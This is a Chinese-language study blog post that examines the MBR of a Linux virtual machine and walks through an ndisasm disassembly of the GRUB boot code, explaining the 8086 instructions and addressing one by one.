<p>活动分区是计算机系统分区，启动操作系统的文件都装在这个分区，Windows 系统下一般被默认为C盘。</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613113709933.png" alt="image-20220613113709933"></p>
</blockquote>
<p>在我的linux虚拟机上观察磁盘的前512个字节</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613211928369.png" alt="image-20220613211928369"></p>
<p>使用dd命令将磁盘的前512个字节备份到虚拟机和Executor本机的共享文件夹下面,然后在本机上用010editor打开刚才导出的备份文件</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613212116779.png" alt="MBR on Linux"></p>
<p>最后两个字节是<code>0x 55 AA</code>表明该512个字节为MBR</p>
<p>从右侧的Hex视图可以看出有一些有意义的字节比如</p>
<p>GRUB,Hard Disk.Read.Error等等</p>
<p>猜测MBR在执行的时候会说一些话,可能就会说这里的ASCII编码</p>
<p>MBR的前466个字节是机器码,boot loader,启动引导程序,在我的虚拟机上即grub程序</p>
<p>第447到510字节是分区表,作用是将硬盘分成不同卷</p>
<p>511到512是标志主引导记录的魔数(0x55 AA)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/loader_menu.gif" alt="启动管理程序的菜单功能与控制权转交功能示意图"></p>
<p>在MOS给出的磁盘文件系统布局图上,可以发现每个磁盘分区最开始都有一个引导块,这个引导块中也可以有grub程序</p>
<p>主引导块之所以叫做”主”,是因为它是BIOS默认调用的引导块,并且主引导块可以选择让权,即把引导工作让给其他磁盘分区中的引导块完成</p>
<p>一般windows系统的主引导块没有这个作用,linux有,而安装多系统的时候主引导块会相互覆盖</p>
<p>因此应该首先安装windows系统然后安装linux系统,如此主引导块就可以选择让权或者直接引导了</p>
<h2 id="Grub"><a href="#Grub" class="headerlink" title="Grub"></a>Grub</h2><p>一是满足我对MBR干了什么的好奇心,而是复习一下计组8086上的汇编语言,我们对Grub进行反汇编分析</p>
<p>我太想知道这短短的466字节机器码,都干了什么了,他们是不是汇编语言或者C语言编译成的机器码呢?</p>
<h3 id="两个阶段"><a href="#两个阶段" class="headerlink" title="两个阶段"></a>两个阶段</h3><p>第一阶段:</p>
<p>boot loader的主程序需要写在主引导分区或者其他磁盘分区的引导块里.</p>
<p>但引导块太小了,只能放下boot loader的最小主程序,相关配置在第二阶段完成</p>
<p>第二阶段:</p>
<p>grub的相关配置都在<code>/boot/grub</code>下面放着</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220615000440311.png" alt="image-20220615000440311"></p>
<p>该目录下面是grub配置文件grub.cfg以及各种文件系统定义</p>
<blockquote>
<p>grub的配置文件不光有<code>grub.cfg</code></p>
<p>redhat,ubuntu等等各种系统的grub配置文件叫法不一样</p>
<p>在我的ubuntu10.04虚拟机上配置文件是grub.cfg</p>
</blockquote>
<h3 id="反汇编分析"><a href="#反汇编分析" class="headerlink" title="反汇编分析"></a>反汇编分析</h3><p>查阅了万能的网友的博客之后,linux上的nasm可以反编译</p>
<p>用我本机上的kali子系统反编译一下就得到了非常像计组课本上的8086汇编语言</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/e/share]</span><br><span class="line">└─# ndisasm mbr.bak &gt; mbr.asm</span><br></pre></td></tr></table></figure>



<p>然后怎么分析?一共223行的汇编指令,属实高估自己的逆向能力了,与其摸着石头过河,不如先了解MBR有什么行为,然后看反汇编去取证</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/bc74f5d963f0419aa3ae51d08950272e.png" alt="MBR总览"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line">00000000  EB63              jmp short 0x65</span><br><span class="line">00000002  90                nop</span><br><span class="line">00000003  108ED0BC          adc [bp-0x4330],cl</span><br><span class="line">00000007  00B0B800          add [bx+si+0xb8],dh</span><br><span class="line">0000000B  008ED88E          add [bp-0x7128],cl</span><br><span class="line">0000000F  C0FBBE            sar bl,byte 0xbe</span><br><span class="line">00000012  007CBF            add [si-0x41],bh</span><br><span class="line">00000015  0006B900          add [0xb9],al</span><br><span class="line">00000019  02F3              add dh,bl</span><br><span class="line">0000001B  A4                movsb</span><br><span class="line">0000001C  EA21060000        jmp 0x0:0x621</span><br><span class="line">00000021  BEBE07            mov si,0x7be</span><br><span class="line">00000024  3804              cmp [si],al</span><br><span class="line">00000026  750B              jnz 0x33</span><br><span class="line">00000028  83C610            add si,byte +0x10</span><br><span class="line">0000002B  81FEFE07          cmp si,0x7fe</span><br><span class="line">0000002F  75F3              jnz 0x24</span><br><span class="line">00000031  EB16              jmp short 0x49</span><br><span class="line">00000033  B402              mov ah,0x2</span><br><span class="line">00000035  B001              mov al,0x1</span><br><span class="line">00000037  BB007C            mov bx,0x7c00</span><br><span class="line">0000003A  B280              mov dl,0x80</span><br><span class="line">0000003C  8A7401            mov dh,[si+0x1]</span><br><span class="line">0000003F  8B4C02            mov cx,[si+0x2]</span><br><span class="line">00000042  CD13              int 0x13</span><br><span class="line">00000044  EA007C0000        jmp 0x0:0x7c00</span><br><span class="line">00000049  EBFE              jmp short 0x49</span><br><span class="line">0000004B  0000              add [bx+si],al</span><br><span class="line">0000004D  0000              add [bx+si],al</span><br><span class="line">0000004F  0000              add [bx+si],al</span><br><span class="line">00000051  0000              add [bx+si],al</span><br><span class="line">00000053  0000              add [bx+si],al</span><br><span class="line">00000055  0000              add [bx+si],al</span><br><span class="line">00000057  0000              add [bx+si],al</span><br><span class="line">00000059  0000              add [bx+si],al</span><br><span class="line">0000005B  800100            add byte [bx+di],0x0</span><br><span class="line">0000005E  0000              add [bx+si],al</span><br><span class="line">00000060  0000              add [bx+si],al</span><br><span class="line">00000062  0000              add [bx+si],al</span><br><span class="line">00000064  FF                db 0xff</span><br><span class="line">00000065  FA                cli</span><br><span class="line">00000066  90                nop</span><br><span class="line">00000067  90                nop</span><br><span class="line">00000068  F6C280            test dl,0x80</span><br><span class="line">0000006B  7502              jnz 0x6f</span><br><span class="line">0000006D  B280              mov dl,0x80</span><br><span class="line">0000006F  EA747C0000        jmp 0x0:0x7c74</span><br><span class="line">00000074  31C0              xor ax,ax</span><br><span class="line">00000076  8ED8              mov ds,ax</span><br><span class="line">00000078  8ED0              mov ss,ax</span><br><span class="line">0000007A  BC0020            mov sp,0x2000</span><br><span class="line">0000007D  FB                sti</span><br><span class="line">0000007E  A0647C            mov al,[0x7c64]</span><br><span class="line">00000081  3CFF              cmp al,0xff</span><br><span class="line">00000083  7402              jz 0x87</span><br><span class="line">00000085  88C2              mov dl,al</span><br><span class="line">00000087  52                push dx</span><br><span class="line">00000088  BB1704            mov bx,0x417</span><br><span class="line">0000008B  802703            and byte [bx],0x3</span><br><span class="line">0000008E  7406              jz 0x96</span><br><span class="line">00000090  BE887D            mov si,0x7d88</span><br><span class="line">00000093  E81C01            call 0x1b2</span><br><span class="line">00000096  BE057C            mov si,0x7c05</span><br><span class="line">00000099  F6C280            test dl,0x80</span><br><span class="line">0000009C  7448              jz 0xe6</span><br><span class="line">0000009E  B441              mov ah,0x41</span><br><span class="line">000000A0  BBAA55            mov bx,0x55aa</span><br><span class="line">000000A3  CD13              int 0x13</span><br><span class="line">000000A5  5A                pop dx</span><br><span class="line">000000A6  52                push dx</span><br><span class="line">000000A7  723D              jc 0xe6</span><br><span class="line">000000A9  81FB55AA          cmp bx,0xaa55</span><br><span class="line">000000AD  7537              jnz 0xe6</span><br><span class="line">000000AF  83E101            and cx,byte +0x1</span><br><span class="line">000000B2  7432              jz 0xe6</span><br><span class="line">000000B4  31C0              xor ax,ax</span><br><span class="line">000000B6  894404            mov [si+0x4],ax</span><br><span class="line">000000B9  40                inc ax</span><br><span class="line">000000BA  8844FF            mov [si-0x1],al</span><br><span class="line">000000BD  894402            mov [si+0x2],ax</span><br><span class="line">000000C0  C7041000          mov word [si],0x10</span><br><span class="line">000000C4  668B1E5C7C        mov ebx,[0x7c5c]</span><br><span class="line">000000C9  66895C08          mov [si+0x8],ebx</span><br><span class="line">000000CD  668B1E607C        mov ebx,[0x7c60]</span><br><span class="line">000000D2  66895C0C          mov [si+0xc],ebx</span><br><span class="line">000000D6  C744060070        mov word [si+0x6],0x7000</span><br><span class="line">000000DB  B442              mov ah,0x42</span><br><span class="line">000000DD  CD13              int 0x13</span><br><span class="line">000000DF  7205              jc 0xe6</span><br><span class="line">000000E1  BB0070            mov bx,0x7000</span><br><span class="line">000000E4  EB76              jmp short 0x15c</span><br><span class="line">000000E6  B408              mov ah,0x8</span><br><span class="line">000000E8  CD13              int 0x13</span><br><span class="line">000000EA  730D              jnc 0xf9</span><br><span class="line">000000EC  F6C280            test dl,0x80</span><br><span class="line">000000EF  0F84D000          jz near 0x1c3</span><br><span class="line">000000F3  BE937D            mov si,0x7d93</span><br><span class="line">000000F6  E98200            jmp 0x17b</span><br><span class="line">000000F9  660FB6C6          movzx eax,dh</span><br><span class="line">000000FD  8864FF            mov [si-0x1],ah</span><br><span class="line">00000100  40                inc ax</span><br><span class="line">00000101  66894404          mov [si+0x4],eax</span><br><span class="line">00000105  0FB6D1            movzx dx,cl</span><br><span class="line">00000108  C1E202            shl dx,byte 0x2</span><br><span class="line">0000010B  88E8              mov al,ch</span><br><span class="line">0000010D  88F4              mov ah,dh</span><br><span class="line">0000010F  40                inc ax</span><br><span class="line">00000110  894408            mov [si+0x8],ax</span><br><span class="line">00000113  0FB6C2            movzx ax,dl</span><br><span class="line">00000116  C0E802            shr al,byte 0x2</span><br><span class="line">00000119  668904            mov [si],eax</span><br><span class="line">0000011C  66A1607C          mov eax,[0x7c60]</span><br><span class="line">00000120  6609C0            or eax,eax</span><br><span class="line">00000123  754E              jnz 0x173</span><br><span class="line">00000125  66A15C7C          mov eax,[0x7c5c]</span><br><span class="line">00000129  6631D2            xor edx,edx</span><br><span class="line">0000012C  66F734            div dword [si]</span><br><span class="line">0000012F  88D1              mov cl,dl</span><br><span class="line">00000131  31D2              xor dx,dx</span><br><span class="line">00000133  66F77404          div dword [si+0x4]</span><br><span class="line">00000137  3B4408            cmp ax,[si+0x8]</span><br><span class="line">0000013A  7D37              jnl 0x173</span><br><span class="line">0000013C  FEC1              inc cl</span><br><span class="line">0000013E  88C5              mov ch,al</span><br><span class="line">00000140  30C0              xor al,al</span><br><span class="line">00000142  C1E802            shr ax,byte 0x2</span><br><span class="line">00000145  08C1              or cl,al</span><br><span class="line">00000147  88D0              mov al,dl</span><br><span class="line">00000149  5A                pop dx</span><br><span class="line">0000014A  88C6              mov dh,al</span><br><span class="line">0000014C  BB0070            mov bx,0x7000</span><br><span class="line">0000014F  8EC3              mov es,bx</span><br><span class="line">00000151  31DB              xor bx,bx</span><br><span class="line">00000153  B80102            mov ax,0x201</span><br><span class="line">00000156  CD13              int 0x13</span><br><span class="line">00000158  721E              jc 0x178</span><br><span class="line">0000015A  8CC3              mov bx,es</span><br><span class="line">0000015C  60                pusha</span><br><span class="line">0000015D  1E                push ds</span><br><span class="line">0000015E  B90001            mov cx,0x100</span><br><span class="line">00000161  8EDB              mov ds,bx</span><br><span class="line">00000163  31F6              xor si,si</span><br><span class="line">00000165  BF0080            mov di,0x8000</span><br><span class="line">00000168  8EC6              mov es,si</span><br><span class="line">0000016A  FC                cld</span><br><span class="line">0000016B  F3A5              rep movsw</span><br><span class="line">0000016D  1F                pop ds</span><br><span class="line">0000016E  61                popa</span><br><span class="line">0000016F  FF265A7C          jmp [0x7c5a]</span><br><span class="line">00000173  BE8E7D            mov si,0x7d8e</span><br><span class="line">00000176  EB03              jmp short 0x17b</span><br><span class="line">00000178  BE9D7D            mov si,0x7d9d</span><br><span class="line">0000017B  E83400            call 0x1b2</span><br><span class="line">0000017E  BEA27D            mov si,0x7da2</span><br><span class="line">00000181  E82E00            call 0x1b2</span><br><span class="line">00000184  CD18              int 0x18</span><br><span class="line">00000186  EBFE              jmp short 0x186</span><br><span class="line">00000188  47                inc di</span><br><span class="line">00000189  52                push dx</span><br><span class="line">0000018A  55                push bp</span><br><span class="line">0000018B  42                inc dx</span><br><span class="line">0000018C  2000              and [bx+si],al</span><br><span class="line">0000018E  47                inc di</span><br><span class="line">0000018F  656F              gs outsw</span><br><span class="line">00000191  6D                insw</span><br><span class="line">00000192  004861            add [bx+si+0x61],cl</span><br><span class="line">00000195  7264              jc 0x1fb</span><br><span class="line">00000197  204469            and [si+0x69],al</span><br><span class="line">0000019A  736B              jnc 0x207</span><br><span class="line">0000019C  005265            add [bp+si+0x65],dl</span><br><span class="line">0000019F  61                popa</span><br><span class="line">000001A0  640020            add [fs:bx+si],ah</span><br><span class="line">000001A3  45                inc bp</span><br><span class="line">000001A4  7272              jc 0x218</span><br><span class="line">000001A6  6F                outsw</span><br><span class="line">000001A7  720D              jc 0x1b6</span><br><span class="line">000001A9  0A00              or al,[bx+si]</span><br><span class="line">000001AB  BB0100            mov bx,0x1</span><br><span class="line">000001AE  B40E              mov ah,0xe</span><br><span class="line">000001B0  CD10              int 0x10</span><br><span class="line">000001B2  AC                lodsb</span><br><span class="line">000001B3  3C00              cmp al,0x0</span><br><span class="line">000001B5  75F4              jnz 0x1ab</span><br><span class="line">000001B7  C3                ret</span><br><span class="line">000001B8  21BF0E00          and [bx+0xe],di</span><br><span class="line">000001BC  0000              add [bx+si],al</span><br><span class="line">000001BE  802021            and byte [bx+si],0x21</span><br><span class="line">000001C1  0083FEFF          add [bp+di-0x2],al</span><br><span class="line">000001C5  FF00              inc word [bx+si]</span><br><span class="line">000001C7  0800              or [bx+si],al</span><br><span class="line">000001C9  0000              add [bx+si],al</span><br><span class="line">000001CB  48                dec ax</span><br><span class="line">000001CC  6308              arpl [bx+si],cx</span><br><span class="line">000001CE  00FE              add dh,bh</span><br><span class="line">000001D0  FF                db 0xff</span><br><span class="line">000001D1  FF05              inc word [di]</span><br><span class="line">000001D3  FE                db 0xfe</span><br><span class="line">000001D4  FF                db 0xff</span><br><span class="line">000001D5  FF                db 0xff</span><br><span class="line">000001D6  FE                db 0xfe</span><br><span class="line">000001D7  57                push di</span><br><span class="line">000001D8  6308              arpl [bx+si],cx</span><br><span class="line">000001DA  02A05C00          add ah,[bx+si+0x5c]</span><br><span class="line">000001DE  0000              add [bx+si],al</span><br><span class="line">000001E0  0000              add [bx+si],al</span><br><span class="line">000001E2  0000              add [bx+si],al</span><br><span class="line">000001E4  0000              add [bx+si],al</span><br><span class="line">000001E6  0000              add [bx+si],al</span><br><span class="line">000001E8  0000              add [bx+si],al</span><br><span class="line">000001EA  0000              add [bx+si],al</span><br><span class="line">000001EC  0000              add [bx+si],al</span><br><span class="line">000001EE  0000              add [bx+si],al</span><br><span class="line">000001F0  0000              add [bx+si],al</span><br><span class="line">000001F2  0000              add [bx+si],al</span><br><span class="line">000001F4  0000              add [bx+si],al</span><br><span class="line">000001F6  0000              add [bx+si],al</span><br><span class="line">000001F8  0000              add [bx+si],al</span><br><span class="line">000001FA  0000              add [bx+si],al</span><br><span class="line">000001FC  0000              add [bx+si],al</span><br><span class="line">000001FE  55                push bp</span><br><span class="line">000001FF  AA                stosb</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<blockquote>
<p>如果使用ida反汇编分析</p>
<p>将mbr.bak改成mbr.exe之后使用ida打开,ida默认Segment bitness为32位,需要改成16位</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220613232353523.png" alt="image-20220613232353523"></p>
<p>一开始ida会把所有指令当作数据,只需要按一下c就可以变为指令</p>
<p>ida提供了交叉引用跳转提示和注释,他真的,我哭死</p>
</blockquote>
<p>以下反汇编分析过程参考了</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lijiewen2017/article/details/124574991">MBR引导程序源码理解</a></p>
<p>和鸟哥的Linux私房菜第19章</p>
<p>首先记住,BIOS将MBR中的Grub加载到主存的0x7c00处,段寄存器cs存放的是0x7c00</p>
<h4 id="00000000-EB63-jmp-short-0x65"><a href="#00000000-EB63-jmp-short-0x65" class="headerlink" title="00000000  EB63        jmp short 0x65"></a><code>00000000  EB63        jmp short 0x65</code></h4><blockquote>
<p>第一条指令,可以看出其反汇编的格式为</p>
<p>内存偏移量,机器码,汇编指令</p>
</blockquote>
<blockquote>
<p>关于8086内存寻址的实现:</p>
<p>段寄存器对内存分段实现,8086上的跳转指令有段跳转和跨段跳转两种</p>
<p>CPU当前执行的指令是由<code>CS:IP</code>两个寄存器共同决定的,物理地址&#x3D;段寄存器*16+偏移地址,<br>$$<br>Addr&#x3D;CS\times 16+IP<br>$$<br>实际上就是CS的二进制表示左移4位,十六进制表示左移一位,然后加上IP</p>
<p>如果CS保持不变则为段内跳转,如果CS改变就是跨段跳转了</p>
<p>段内跳转:<code>jmp short artx</code></p>
<p>artx就是要跳转到的<strong>绝对地址</strong></p>
<p>artx是计算得到的,怎么算的呢?</p>
<p>在执行本条指令的时候,IP已经指向下一条指令的地址,</p>
<p>在实际的机器码指令中保存的是相对偏移量DISP,用这个相对偏移量加上更新了的IP得到的就是要跳转到的绝对地址</p>
<p>short表示为一个8位带符号数(范围$[-128,127]$),意思是限制相对偏移量DISP的范围</p>
</blockquote>
<p>在执行本条指令<code>00000000  EB63        jmp short 0x65</code>时,<code>IP=0x2</code>,</p>
<p>机器码<code>EB63</code>告诉我们相对偏移量<code>DISP=0x63</code>,</p>
<p><code>IP=IP+DISP=0x2+0x63=0x65</code></p>
<blockquote>
<p>至于为什么上来就要跳转到中间,越过好多字节,这个问题在<code>00000096  BE057C       mov si,0x7c05</code>我们会恍然大悟,现在看来是越过了好多”指令”没有执行,实际上不是”指令”,是反汇编器将数据也反汇编成指令了</p>
</blockquote>
<p>由于该跳转无条件执行,我们跟随该跳转,看看发生了什么</p>
<h4 id="00000065-FA-cli"><a href="#00000065-FA-cli" class="headerlink" title="00000065  FA         cli"></a><code>00000065  FA         cli</code></h4><blockquote>
<p>关于处理器控制指令</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614112455326.png" alt="image-20220614112455326"></p>
</blockquote>
<p>CLI之后,IF置0,CPU不允许中断</p>
<blockquote>
<p>信号量的机制应该也是这样</p>
</blockquote>
<p>此处的CLI指令和后面<code>0000007D  FB         sti</code>相互匹配</p>
<p>进行了一个CPU的中断关开</p>
<h4 id="00000066-90-nop"><a href="#00000066-90-nop" class="headerlink" title="00000066  90         nop"></a><code>00000066  90         nop</code></h4><p>空操作指令 NOP 执行该指令并不产生任何结果，<strong>仅仅消耗 3 个时钟周期的时间</strong>，常用于程序的延时等。</p>
<h4 id="00000067-90-nop"><a href="#00000067-90-nop" class="headerlink" title="00000067  90         nop"></a><code>00000067  90         nop</code></h4><p>同样啥也不干,耗时</p>
<h4 id="00000068-F6C280-test-dl-0x80"><a href="#00000068-F6C280-test-dl-0x80" class="headerlink" title="00000068  F6C280       test dl,0x80"></a><code>00000068  F6C280       test dl,0x80</code></h4><p>测试一下<code>dl</code>是否为<code>0x80</code></p>
<p>如果<code>dl==0x80</code>则<code>ZF=1</code>否则<code>ZF=0</code>,设置标志位之后方便后续的条件转移等</p>
<blockquote>
<p>回顾一下grub干了啥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> 将程序代码由<span class="number">0</span>:<span class="number">7</span>C00H移动到<span class="number">0</span>:<span class="number">0600</span>H（注，BIOS把MBR放在<span class="number">0</span>:<span class="number">7</span>C00H处）</span><br><span class="line"><span class="number">2</span> 搜索可引导分区，即<span class="number">80</span>H标志</span><br><span class="line">成功：<span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">失败：跳入ROM BASIC</span><br><span class="line">无效分区表：<span class="keyword">goto</span> <span class="number">5</span></span><br><span class="line"><span class="number">3</span> 读引导扇区</span><br><span class="line">失败：<span class="keyword">goto</span> <span class="number">5</span></span><br><span class="line">成功：<span class="keyword">goto</span> <span class="number">4</span></span><br><span class="line"><span class="number">4</span> 验证引导扇区最后是否为<span class="number">55</span>AAH</span><br><span class="line">失败：<span class="keyword">goto</span> <span class="number">5</span></span><br><span class="line">成功：<span class="keyword">goto</span> <span class="number">6</span></span><br><span class="line"><span class="number">5</span> 打印错误进入无穷循环</span><br><span class="line"><span class="number">6</span> 跳到<span class="number">0</span>:<span class="number">7</span>C00H进行下一步启动工作</span><br></pre></td></tr></table></figure>

<p>80H是可引导分区的标志</p>
</blockquote>
<p>硬盘的驱动器号从0x80开始编号,这里测试dl是不是80开头的,目的是判断是否是硬盘驱动</p>
<p>奇怪的是,在此之前的指令中并没有设置dl值的指令,因此dl此时为0,本次测试必然不通过</p>
<h4 id="0000006B-7502-jnz-0x6f"><a href="#0000006B-7502-jnz-0x6f" class="headerlink" title="0000006B  7502        jnz 0x6f"></a><code>0000006B  7502        jnz 0x6f</code></h4><blockquote>
<p>关于条件跳转指令</p>
<p>条件转移指令的目的地址必须在现行的代码段（CS）内，并且以 当前指令指针寄存器 IP 内容为基准，转移范围内在＋127～－128 的范围之内。</p>
</blockquote>
<p>如果刚才判断的dl是<code>0x80</code>则跳转<code>0x6f</code>,</p>
<p>我们按照某些工作都没做,dl还没有被置为0x80,暂且不跟随跳转,顺序执行</p>
<h4 id="0000006D-B280-mov-dl-0x80"><a href="#0000006D-B280-mov-dl-0x80" class="headerlink" title="0000006D  B280              mov dl,0x80"></a><code>0000006D  B280              mov dl,0x80</code></h4><p>说曹操,曹操到,现在将dl置为0x80标志某些工作已经进行了</p>
<h4 id="0000006F-EA747C0000-jmp-0x0-0x7c74"><a href="#0000006F-EA747C0000-jmp-0x0-0x7c74" class="headerlink" title="0000006F  EA747C0000     jmp 0x0:0x7c74"></a><code>0000006F  EA747C0000     jmp 0x0:0x7c74</code></h4><p>绝对跳转,跳转到<code>0x7c74</code>,也就是<code>0x74</code>位置,笑死,就在下一行</p>
<h4 id="00000074-31C0-xor-ax-ax"><a href="#00000074-31C0-xor-ax-ax" class="headerlink" title="00000074  31C0        xor ax,ax"></a><code>00000074  31C0        xor ax,ax</code></h4><p>ax寄存器置零,没有用<code>mov ax,0</code>是因为mov指令编码长,用xor指令优化</p>
<h4 id="00000076-8ED8-mov-ds-ax"><a href="#00000076-8ED8-mov-ds-ax" class="headerlink" title="00000076  8ED8        mov ds,ax"></a><code>00000076  8ED8        mov ds,ax</code></h4><p><code>0-&gt;ax-&gt;ds</code></p>
<p>ds段寄存器置0,</p>
<h4 id="00000078-8ED0-mov-ss-ax"><a href="#00000078-8ED0-mov-ss-ax" class="headerlink" title="00000078  8ED0        mov ss,ax"></a><code>00000078  8ED0        mov ss,ax</code></h4><p>ss寄存器置0</p>
<blockquote>
<p>ss为stack segment,堆栈段寄存器,栈顶指针的段地址在ss寄存器中,段内偏移量在sp中,ss:sp指向栈顶</p>
</blockquote>
<h4 id="0000007A-BC0020-mov-sp-0x2000"><a href="#0000007A-BC0020-mov-sp-0x2000" class="headerlink" title="0000007A  BC0020       mov sp,0x2000"></a><code>0000007A  BC0020       mov sp,0x2000</code></h4><p>本步和上一步正式建立了栈空间</p>
<h4 id="0000007D-FB-sti"><a href="#0000007D-FB-sti" class="headerlink" title="0000007D  FB         sti"></a><code>0000007D  FB         sti</code></h4><blockquote>
<p>关于处理器控制指令</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220614111629831.png" alt="image-20220614111629831"></p>
</blockquote>
<p>标志位指令,STI是开中断标志,该指令执行之后IF&#x3D;1,意思是允许CPU发生中断了,</p>
<p>本指令和<code>00000065  FA         cli</code>之间的指令会被CPU一直执行不被中断,这保证了各种寄存器和堆栈等一直有效</p>
<h4 id="0000007E-A0647C-mov-al-0x7c64"><a href="#0000007E-A0647C-mov-al-0x7c64" class="headerlink" title="0000007E  A0647C       mov al,[0x7c64]"></a><code>0000007E  A0647C       mov al,[0x7c64]</code></h4><p>一个直接寻址,将内存上<code>0x7c64</code>这个单元中的东西放在<code>al</code>寄存器中</p>
<p><code>0x7c64</code>所指位置代表启动盘,内核存放其中</p>
<p>这个单元放了啥呢?	<code>00000064  FF         db 0xff</code></p>
<p><code>0xff</code>表示使用启动盘</p>
<h4 id="00000081-3CFF-cmp-al-0xff"><a href="#00000081-3CFF-cmp-al-0xff" class="headerlink" title="00000081  3CFF        cmp al,0xff"></a><code>00000081  3CFF        cmp al,0xff</code></h4><p>蜜汁操作,刚刚把<code>M[0x7c64]=0xff</code>放进al,就要检查al是不是<code>0xff</code></p>
